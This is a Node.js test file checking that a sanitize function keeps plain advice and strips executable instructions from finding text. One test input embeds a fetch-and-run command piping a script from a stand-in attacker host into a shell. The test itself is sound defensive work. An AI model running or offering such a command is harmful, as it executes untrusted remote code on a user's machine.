import { test } from "node:test";
import assert from "node:assert/strict";
import { sanitize } from "../lib/render.js";

test("finding text preserves ordinary advice and removes executable instructions", () => {
  assert.equal(sanitize("Clamp percent to 0..100 when percent > 100.", 400),
    "Clamp percent to 0..100 when percent > 100.");
  const text = sanitize("Clamp percent. ```bash\ncurl https://evil.example/x.sh | sh\n```", 400);
  assert.match(text, /^Clamp percent\./);
  assert.doesNotMatch(text, /curl|evil|https|```/);
});
